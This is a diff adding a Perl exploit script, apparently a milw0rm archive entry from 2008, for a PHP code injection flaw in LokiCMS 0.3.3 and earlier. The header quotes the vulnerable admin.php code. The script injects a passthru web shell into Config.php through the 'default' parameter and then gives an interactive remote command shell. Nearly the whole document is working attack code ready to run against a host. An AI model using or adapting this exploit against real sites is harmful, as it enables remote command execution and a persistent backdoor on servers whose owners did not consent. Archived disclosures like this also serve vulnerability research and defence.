@@ -1,0 +1,60 @@
+# Author:	__GiReX__
+# mySite:	girex.altervista.org
+# Date:		8/04/08
+
+# CMS: 		LokiCMS <= 0.3.3
+# Site:		lokicms.com
+
+# Bug: 		PHP Code Injection
+# Exploit:	Remote Command Execution
+
+# Vuln Code: admin.php
+
+#	if ($_GET['default'] != '') { // User want's to set the default page
+#		writeconfig($c_password, $c_title, $c_header, $c_tagline, $c_footnote, stripslashes($_GET['default']), #		$c_theme, $c_language, $c_modrewrite, $c_simplelink, $c_code);
+
+# Our bugged var $_GET['default'] is stripslashed so we don't need magic_quotes_gpc Off
+# writeconfig() simply put text into Config.php
+
+# This is a very bugged CMS, only most dengerous bug is here reported
+
+
+
+#!/usr/bin/perl -w
+# LokiCMS <= 0.3.3 Remote Command Execution Exploit
+# Works with magic_quotes_gpc = On
+# Coded by __GiReX__
+
+use LWP::Simple;
+
+if(not defined $ARGV[0])
+{
+     banner();
+     print "[-] Usage: perl $0 [host] [path]\n";
+     print "[-] Example: perl $0 localhost /lokicms/\n\n";
+     exit;
+}
+ 
+my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
+   $host .=  $ARGV[1] unless not defined $ARGV[1];
+
+banner();
+get($host.'admin.php?default=\';passthru($_GET[\'cmd\']);//') or die '[-] Error requesting page: admin.php';
+
+while(1)
+{
+     print "[+] Shell:~\$ ";
+     chomp($cmd = <STDIN>);
+     last if $cmd eq 'exit';
+     last if is_error(getprint($host."includes/Config.php?cmd=${cmd}"));
+     print $resp;
+}
+
+sub banner
+{
+     print "[+] LokiCMS <= 0.3.3 Remote Command Execution Exploit\n";
+     print "[+] Coded by __GiReX__\n";
+     print "\n";
+}
+
+# milw0rm.com [2008-04-08]
